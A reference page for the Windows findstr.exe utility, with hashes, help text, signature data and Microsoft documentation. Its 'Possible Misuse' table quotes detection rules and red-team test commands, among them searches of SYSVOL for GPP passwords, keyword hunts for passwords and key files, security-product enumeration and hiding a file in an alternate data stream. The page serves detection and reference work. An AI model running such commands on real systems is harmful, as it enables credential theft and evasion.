﻿---
title: findstr.exe | Find String (QGREP) Utility
---

# findstr.exe 

* File Path: `C:\Windows\SysWOW64\findstr.exe`
* Description: Find String (QGREP) Utility
* Comments: 

## Hashes

Type | Hash
-- | --
MD5 | `0CF22201B4A50DFF346974A17A5BC0ED`
SHA1 | `EFD02B322F9B2C5D18C198AA80B0F68FB1F96217`
SHA256 | `6212E4EB194109C71815ACE1ED8D56139DDA04BE2F6E1BB01EAC9315C6FB5ABF`
SHA384 | `FB133FF62EAFA075219B0E4262644EE5B3D7EFB8E051356FB3EDD24227885FA2175EC60944B320E91D6C86118E4A2476`
SHA512 | `5A19CC9C2EF879B69F9C71FCBC0AFFDF9AA1D8F193D8BACBC3CCF6788B83704F19CA2784F73E5D539552902C44EB7AD58CBD42519B03CBE344BF2BBC479A7AF5`
SSDEEP | `384:ZpHel/BQrlTB7hfbKoq0dhRUb+AZu8Lx9XyFkBRonD1VQjWf5GNYoCPUh0D3fWXv:Wl/GhN9OuJuHaCqgYAh0zdvQ`

## Runtime Data

### Usage (stdout):
```Batchfile
Searches for strings in files.

FINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/P] [/F:file]
        [/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]]
        strings [[drive:][path]filename[ ...]]

  /B         Matches pattern if at the beginning of a line.
  /E         Matches pattern if at the end of a line.
  /L         Uses search strings literally.
  /R         Uses search strings as regular expressions.
  /S         Searches for matching files in the current directory and all
             subdirectories.
  /I         Specifies that the search is not to be case-sensitive.
  /X         Prints lines that match exactly.
  /V         Prints only lines that do not contain a match.
  /N         Prints the line number before each line that matches.
  /M         Prints only the filename if a file contains a match.
  /O         Prints character offset before each matching line.
  /P         Skip files with non-printable characters.
  /OFF[LINE] Do not skip files with offline attribute set.
  /A:attr    Specifies color attribute with two hex digits. See "color /?"
  /F:file    Reads file list from the specified file(/ stands for console).
  /C:string  Uses specified string as a literal search string.
  /G:file    Gets search strings from the specified file(/ stands for console).
  /D:dir     Search a semicolon delimited list of directories
  strings    Text to be searched for.
  [drive:][path]filename
             Specifies a file or files to search.

Use spaces to separate multiple search strings unless the argument is prefixed
with /C.  For example, 'FINDSTR "hello there" x.y' searches for "hello" or
"there" in file x.y.  'FINDSTR /C:"hello there" x.y' searches for
"hello there" in file x.y.

Regular expression quick reference:
  .        Wildcard: any character
  *        Repeat: zero or more occurrences of previous character or class
  ^        Line position: beginning of line
  $        Line position: end of line
  [class]  Character class: any one character in set
  [^class] Inverse class: any one character not in set
  [x-y]    Range: any characters within the specified range
  \x       Escape: literal use of metacharacter x
  \<xyz    Word position: beginning of word
  xyz\>    Word position: end of word

For full information on FINDSTR regular expressions refer to the online Command
Reference.

```

### Usage (stderr):
```Batchfile
FINDSTR: /h ignored
FINDSTR: Bad command line

```

### Child Processes:
conhost.exe

## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: FINDSTR.EXE
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `findstr.exe` being misused. While `findstr.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_findstr_lnk.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_findstr_lnk.yml) | `title: Findstr Launching .lnk File` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_findstr_lnk.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_findstr_lnk.yml) | `description: Detects usage of findstr to identify and execute a lnk file as seen within the HHS redirect attack` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_findstr_lnk.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_findstr_lnk.yml) | `        Image: '*\findstr.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `            - '\findstr.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `Name: Findstr.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `  - Command: findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `  - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `  - Command: findstr /S /I cpassword \\sysvol\policies\*.xml` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `  - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `  - Path: C:\Windows\System32\findstr.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `  - Path: C:\Windows\SysWOW64\findstr.exe` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) |   - Atomic Test #3: Extracting passwords with findstr [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) |   - Atomic Test #1: GPP Passwords (findstr) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) |   - Atomic Test #3: Extracting passwords with findstr [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) |   - Atomic Test #1: GPP Passwords (findstr) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1003.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md) | reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType \| findstr LanmanNT  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1012.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.md) | reg query HKLM\system\currentcontrolset\services /s \| findstr ImagePath 2>nul \| findstr /Ri ".*\.sys$" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1018.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md) | $localip = ((ipconfig \| findstr [0-9].\.)[0]).Split()[-1] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1033.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md) | for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^\| findstr "Active Disc"') do @echo %i \| find /v "#" \| find /v "console" \|\| echo %j > usernames.txt | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1033.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md) | @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^\| findstr "Active Disc"') do @echo %i \| find /v "#" \| find /v "console" \|\| echo %j > usernames.txt | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1119.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md) | dir c: /b /s .docx \| findstr /e .docx | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1490.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md) | if(!(vssadmin.exe list shadows \| findstr "No items found that satisfy the query.")) { exit 0 } else { exit 1 }  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | tasklist.exe \| findstr /i virus | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | tasklist.exe \| findstr /i cb | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | tasklist.exe \| findstr /i defender | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | tasklist.exe \| findstr /i cylance | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | fltmc.exe \| findstr.exe 385201 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md) | - [Atomic Test #3 - Extracting passwords with findstr](#atomic-test-3---extracting-passwords-with-findstr) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md) | ## Atomic Test #3 - Extracting passwords with findstr | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md) | findstr /si pass *.xml *.doc *.txt *.xls | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.md) | dir c:\ /b /s .key \| findstr /e .key | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.006.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md) | - [Atomic Test #1 - GPP Passwords (findstr)](#atomic-test-1---gpp-passwords-findstr) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.006.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md) | ## Atomic Test #1 - GPP Passwords (findstr) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.006.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md) | findstr /S cpassword %logonserver%\sysvol\*.xml | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | if ((cmd.exe /c "where.exe Sysmon.exe 2> nul \| findstr Sysmon 2> nul") -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 }  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | if(sc.exe query sysmon \| findstr sysmon) { exit 0 } else { exit 1 }  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | if(cmd.exe /c "where.exe Sysmon.exe 2> nul \| findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | if(fltmc.exe filters \| findstr #{sysmon_driver}) { exit 0 } else { exit 1 }  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [python](https://github.com/redcanaryco/atomic-red-team/blob/master/execution-frameworks/contrib/python/README.md) |     for /F "tokens=1,2" %i in ('qwinsta /server:${computer_name} ^\| findstr "Active Disc"') do @echo %i \| find /v "#" \| find /v "c | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [python](https://github.com/redcanaryco/atomic-red-team/blob/master/execution-frameworks/contrib/python/README.md) |     @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^\| findstr "Active Disc"') do @echo %i \| find | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## findstr

Searches for patterns of text in files.

### Syntax

```
findstr [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:<file>] [/c:<string>] [/g:<file>] [/d:<dirlist>] [/a:<colorattribute>] [/off[line]] <strings> [<drive>:][<path>]<filename>[ ...]
```

#### Parameters

| Parameter | Description |
| --------- | ----------- |
| /b | Matches the text pattern if it is at the beginning of a line. |
| /e | Matches the text pattern if it is at the end of a line. |
| /l | Processes search strings literally. |
| /r | Processes search strings as regular expressions. This is the default setting. |
| /s | Searches the current directory and all subdirectories. |
| /i | Ignores the case of the characters when searching for the string. |
| /x | Prints lines that match exactly. |
| /v | Prints only lines that don't contain a match. |
| /n | Prints the line number of each line that matches. |
| /m | Prints only the file name if a file contains a match. |
| /o | Prints character offset before each matching line. |
| /p | Skips files with non-printable characters. |
| /off[line] | Does not skip files that have the offline attribute set. |
| /f:`<file>` | Gets a file list from the specified file. |
| /c:`<string>` | Uses the specified text as a literal search string. |
| /g:`<file>` | Gets search strings from the specified file. |
| /d:`<dirlist>` | Searches the specified list of directories. Each directory must be separated with a semicolon (;), for example `dir1;dir2;dir3`. |
| /a:`<colorattribute>` | Specifies color attributes with two hexadecimal digits. Type `color /?` for additional information. |
| `<strings>` | Specifies the text to search for in *filename*. Required. |
| `[\<drive>:][<path>]<filename>[ ...]` | Specifies the location and file or files to search. At least one file name is required. |
| /? | Displays Help at the command prompt. |

##### Remarks

- All **findstr** command-line options must precede *strings* and *filename* in the command string.

- Regular expressions use both literal characters and meta-characters to find patterns of text, rather than exact strings of characters.

  - A literal character is a character that doesn't have a special meaning in the regular-expression syntax; instead, it matches an occurrence of that character. For example, letters and numbers are literal characters.

  - A meta-character is a symbol with special meaning (an operator or delimiter) in the regular-expression syntax.

    The accepted meta-characters, are:

    | Meta-character | Value |
    | -------------- | ----- |
    | `.` | **Wildcard** - Any character |
    | `*` | **Repeat** - Zero or more occurrences of the previous character or class. |
    | `^` | **Beginning line position** - Beginning of the line. |
    | `$` | **Ending line position** - End of the line. |
    | `[class]` | **Character class** - Any one character in a set. |
    | `[^class]` | **Inverse class** - Any one character not in a set. |
    | `[x-y]` | **Range** - Any characters within the specified range. |
    | `\x` | **Escape** - Literal use of a meta-character. |
    | `<string` | **Beginning word position** - Beginning of the word. |
    | `string>` | **Ending word position** - End of the word. |

    The special characters in regular expression syntax have the most power when you use them together. For example, use the combination of the wildcard character (`.`) and repeat (`*`) character to match any string of characters: `.*`

    Use the following expression as part of a larger expression to match any string beginning with *b* and ending with *ing*: `b.*ing`

- To search for multiple strings in a set of files, you must create a text file that contains each search criterion on a separate line.

- Use spaces to separate multiple search strings unless the argument is prefixed with **/c**.

#### Examples

To search for *hello* or *there* in file *x.y*, type:

```
findstr hello there x.y
```

To search for *hello there* in file *x.y*, type:

```
findstr /c:hello there x.y
```

To find all occurrences of the word *Windows* (with an initial capital letter W) in the file *proposal.txt*, type:

```
findstr Windows proposal.txt
```

To search every file in the current directory and all subdirectories that contained the word *Windows*, regardless of the letter case, type:

```
findstr /s /i Windows *.*
```

To find all occurrences of lines that begin with *FOR* and are preceded by zero or more spaces (as in a computer program loop), and to display the line number where each occurrence is found, type:

```
findstr /b /n /r /c:^ *FOR *.bas
```

To list the exact files that you want to search in a text file, use the search criteria in the file *stringlist.txt*, to search the files listed in *filelist.txt*, and then to store the results in the file *results.out*, type:

```
findstr /g:stringlist.txt /f:filelist.txt > results.out
```

To list every file containing the word *computer* within the current directory and all subdirectories, regardless of case, type:

```
findstr /s /i /m <computer> *.*
```

To list every file containing the word computer and any other words that begin with comp, (such as compliment and compete), type:

```
findstr /s /i /m <comp.* *.*
```

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

---



MIT License. Copyright (c) 2020 Strontic.

